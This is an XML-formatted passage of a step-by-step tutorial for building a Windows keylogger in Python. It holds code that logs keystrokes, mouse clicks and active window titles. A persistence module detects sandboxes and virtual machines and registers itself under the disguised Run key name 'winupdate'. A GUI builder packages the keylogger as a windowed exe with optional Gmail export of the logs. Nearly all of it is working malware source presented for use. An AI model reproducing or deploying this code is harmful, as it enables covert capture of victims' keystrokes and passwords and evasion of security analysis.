      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def on_keyboard_event(self, event):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if event == KEY.backspace:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += " [Bck] "</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>elif event == KEY.tab:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += " [Tab] "</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>elif event == KEY.enter:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += "\n"</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>elif event == KEY.space:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += " "</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>elif type(event) == KEY:<text:s text:c="2"/># if the character is some other type of special key</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += " [" + str(event)[4:] + "] "</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>else:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += str(event)[1:len(str(event)) - 1]<text:s text:c="2"/># remove quotes around</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.check_escape_char(event)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def check_escape_char(self, key):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_combo.append(key)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if key != self.escape_combo[len(self.key_combo) - 1]:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_combo = []</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>else:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>if self.key_combo == self.escape_combo:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="16"/>self.stop_key_logger()</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def on_click_event(self, x, y, button, pressed):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>current_window = GetWindowText(GetForegroundWindow())</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if not (self.window == current_window or current_window == ""):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.window = current_window</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="12"/>self.key_log += "\n" + "-" * 5 + f"{self.window}" + "-" * 5 + "\n"</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48">STEP4:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48">Inside your folder create a new file inside src and name it persistence.py and put the following code.</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"/></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">import ctypes, wmi, win32event, win32api, winerror, os, shutil, winreg</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">def detect_sandboxie():</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>ctypes.windll.LoadLibrary("SbieDll.dll")</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return True</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>except: return False</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">def detect_vm():</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>for disk_drive in wmi.WMI().query("Select * from Win32_DiskDrive"):</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>if "vbox" in disk_drive.Caption.lower() or "virtual" in disk_drive.Caption.lower():</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="12"/>return True</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>return False</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">def instance_running():</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>mutex = None</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return True</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>else:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return False</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">def add_to_startup(appdata_path, current_file_path):</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>path = appdata_path + "\\" + os.path.basename(current_file_path)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>shutil.copyfile(current_file_path, path)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_SZ, path)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>winreg.CloseKey(key)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return True</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>except:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return False</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">def remove_from_startup():</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>winreg.DeleteValue(key, REG_VALUE_NAME)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>winreg.CloseKey(key)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return True</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="4"/>except:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"><text:s text:c="8"/>return False</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49">REG_VALUE_NAME = "winupdate"</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T49"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T50">STEP5:</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T50">Inside your folder create a new file inside src and name it tools.py and put the following code.</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T51">import subprocess</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T51">def get_env_var(var):</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T51"><text:s text:c="4"/>command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE,</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T51"><text:s text:c="31"/>stdin=subprocess.PIPE, shell=True)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T51"><text:s text:c="4"/>return ((command.stdout.read()).decode("utf-8").splitlines()[0]).replace("\\", "/")</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T52">STEP6:</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T52">Inside your folder create a new file outside src and name it setup.py and put the following code.</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">from tkinter import *</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">import os, shutil, sys</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">from tkinter import messagebox</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">python_path = "\"" + os.path.dirname(sys.executable)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">if not os.path.isfile("main.py"):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>print("main.py not found!")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>sys.exit(0)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">def save_file(constructor, gmail_args):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>new_line = f"if __name__ == \"__main__\": main = main{constructor};"</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>if gmail_args != "": new_line += f"main.override_gmail{gmail_args};"</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>new_line += "main.start()"</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>i = 0</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file = open("main.py", "r")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file_contents = file.readlines()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file.close()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/># use loop in order to ensure that line number doesnt matter</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>for i in range(0, len(file_contents)):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>if file_contents[i][0:len("if __name__ == \"__main__\":")] == "if __name__ == \"__main__\":":</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="12"/>break</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file_contents = file_contents[:i]</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file_contents.append(new_line)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file = open("main.py", "w")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file.writelines(file_contents)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>file.close()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">def build():</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>except: pass</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>os.system(python_path + "/Scripts/pyinstaller\" main.py --onefile --windowed --icon icon/exe.ico")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">class setup:</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def __init__(self, ):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.config_bool = [False, False, False, False]</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.use_gmail = False</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def create_ui(self, title, x, y):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root = Tk()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.geometry(f"{x}x{y}")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.resizable(0, 0)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.title(title)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_time = Entry(self.root, bd=3)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>Label(self.root, text="Export logs interval (s)").pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_time.insert(END, "600")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_time.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_export = Entry(self.root, bd=3)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>Label(self.root, text="Path to log export").pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_export.insert(END, "%userprofile%\\log.txt")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_export.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.lb_frame = LabelFrame(self.root, text="Gmail export")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.lb_frame.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_username = Entry(self.lb_frame, bd=3)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>Label(self.lb_frame, text="Gmail username").pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_username.insert(END, "james@gmail.com")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_username.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_pass = Entry(self.lb_frame, bd=3)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>Label(self.lb_frame, text="Gmail password").pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_pass.insert(END, "james123")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.txt_pass.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.lb_frame2 = LabelFrame(self.root, text="Optional config")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.lb_frame2.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_use_gmail = Button(self.lb_frame2, text="Use Gmail export", width=18, bd=4, command=self.on_click_use_gmail)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_use_gmail.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_log_click = Button(self.lb_frame2, text="Log clicks", width=18, bd=4, command=self.on_click_log_click)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_log_click.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_add_to_startup = Button(self.lb_frame2, text="Add to startup", width=18, bd=4, command=self.on_click_add_to_startup)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_add_to_startup.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_vm = Button(self.lb_frame2, text="Disable for VMs", width=18, bd=4, command=self.on_click_check_vm)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_vm.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_sandboxie = Button(self.lb_frame2, text="Disable for sandbox", width=18, bd=4, command=self.on_click_check_sandboxie)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_sandboxie.pack()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_build = Button(self.root, text="Build", width=28, bd=4, command=self. on_click_build)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_build.pack(side=BOTTOM)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.mainloop()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_use_gmail(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="7"/>self.btn_use_gmail.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.use_gmail = True</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_log_click(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_log_click.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.config_bool[1] = True</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_add_to_startup(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_add_to_startup.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.config_bool[0] = True</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_check_vm(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_vm.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.config_bool[2] = True</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_check_sandboxie(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_sandboxie.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.config_bool[3] = True</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>def on_click_build(self):</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>gmail_args = ""</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_build.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_use_gmail.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_log_click.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_add_to_startup.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_vm.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.btn_check_sandboxie.configure(state="disabled")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>constructor_args = f"({self.txt_time.get()}, \"{self.txt_export.get()}\", {self.config_bool[0]}, " \</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="27"/>f"{self.config_bool[1]}, {self.config_bool[2]}, {self.config_bool[3]})"</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>if self.use_gmail: gmail_args = f"(\"{self.txt_username.get()}\", \"{self.txt_pass.get()}\")"</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.withdraw()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>save_file(constructor_args, gmail_args)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>build()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>messagebox.showinfo("Build", "Finished!")</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="8"/>self.root.destroy()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53">if __name__ == "__main__":</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>setup = setup()</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T53"><text:s text:c="4"/>setup.create_ui("Setup", 300, 500)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T54">STEP7:</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T55">Now Run the command python setup.py to start the Gui in order to build your keylogger</text:span><text:span text:style-name="T56"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T5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